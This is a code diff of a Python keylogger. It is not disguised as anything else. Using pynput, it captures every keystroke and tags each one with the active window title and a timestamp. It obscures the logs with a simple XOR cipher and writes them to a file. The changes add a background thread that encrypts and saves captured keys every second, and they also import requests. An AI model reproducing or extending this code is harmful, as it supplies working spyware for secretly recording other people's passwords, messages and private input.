@@ -1,8 +1,6 @@
 from abc import ABC, abstractmethod
 from pynput.keyboard import Listener
-import time,json,random,string, threading,pywinctl,requests
-from KeyLoggerAgent import ToolBox
-
+import time,json,random,string,ToolBox,threading,pygetwindow,requests
 
 class IKeyLogger(ABC):
     @abstractmethod
@@ -39,10 +37,10 @@ class KeyLoggerService(IKeyLogger):
         key = ToolBox.format_key(key)
         current_time = time.time()
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
-        active_window = pywinctl.getActiveWindow()
+        active_window = pygetwindow.getActiveWindowTitle()
 
-        if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
-            self.__last_record = active_window.title + ': ' + current_time_formatted
+        if self.__last_type_time is None or current_time - self.__last_type_time >= 2 or active_window != self.__last_window:
+            self.__last_record = active_window + ': ' + current_time_formatted
 
         self.__last_type_time = current_time
         self.__last_window = active_window
@@ -51,9 +49,10 @@ class KeyLoggerService(IKeyLogger):
         self.__logged_keys[self.__last_record] += key
 
     def get_logged_keys(self) -> dict[str:str]:
-        if len(self.__logged_keys)<1:
-            return {}
-        return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
+        # if len(self.__logged_keys)<1:
+        #     return {}
+        # return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
+        return self.__logged_keys
 
 
     def clear_logged_keys(self) -> dict[str:str]:
@@ -63,13 +62,14 @@ class KeyLoggerService(IKeyLogger):
 
 class FileWriter(Write):
     def __init__(self,path=None):
-        self.path = path or r""
+        self.path = ToolBox.get_file_path()
 
     def write(self, data:dict[str:str]) -> bool:
         try:
-            with open(self.path,"a") as file:
+            with open(self.path,"a",encoding='utf-8') as file:
                 convert_data = json.dumps(data)
                 file.write(convert_data)
+                print(self.path)
                 return True
         except IOError:
             return False
@@ -92,8 +92,8 @@ class Encryptor:
     def encrypt(self,data:str) -> str:
         ciphertext = ""
         length_key = len(self.key)
-        for i in range(len(data)):
-            ciphertext += chr(ord(data[i]) ^ ord(self.key[i % length_key]))
+        for index in range(len(data)):
+            ciphertext += chr(ord(data[index]) ^ ord(self.key[index % length_key]))
         return ciphertext
 
 class KeyLoggerManager:
@@ -103,18 +103,34 @@ class KeyLoggerManager:
         self.__encryptor = Encryptor()
         self.__is_logging = False
         self.__logger_thread = threading.Thread(target=self.__listen)
+        self.__send_data_thread = threading.Thread(target=self.__send_data)
 
 
     def start_logging(self):
         self.__is_logging = True
         self.__logger_thread.start()
+        self.__send_data_thread.start()
 
     def stop_logging(self):
         self.__is_logging = False
+        self.listener.stop()
 
     def __listen(self):
-        with Listener(on_press=self.__key_logger.on_press) as listener:
-            listener.join()
+        with Listener(on_press=self.__key_logger.on_press) as self.listener:
+            self.listener.join()
+
+    def __send_data(self):
+        while self.__is_logging:
+            data = self.__key_logger.get_logged_keys()
+            encrypt_data = {self.__encryptor.encrypt(key):self.__encryptor.encrypt(value) for key,value in data.items()}
+            self.__writer.write(encrypt_data)
+            print(data)
+            time.sleep(1)
+
+
+
+
+
 
     def print_keys(self):
         logged_keys = self.__key_logger.get_logged_keys()
@@ -125,9 +141,13 @@ class KeyLoggerManager:
 
 x = KeyLoggerManager()
 x.start_logging()
-while True:
-    # time.sleep(1)
-    x.print_keys()
+for i in range(3):
+    time.sleep(2)
+
+x.stop_logging()
+
+
+
 
 
 
